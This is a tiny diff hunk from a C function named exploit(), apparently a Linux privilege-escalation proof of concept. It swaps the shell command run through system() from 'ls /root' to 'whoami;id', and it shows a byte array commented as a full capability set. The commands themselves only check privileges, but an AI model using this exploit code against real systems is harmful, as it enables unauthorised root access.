@@ -95,7 +95,7 @@ static int exploit() {
     
 
     // Ganti dengan perintah 'chown root:root' untuk file tertentu
-    system("ls /root");
+    system("whoami;id");
 
     // all+ep
     char cap[] = "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00";
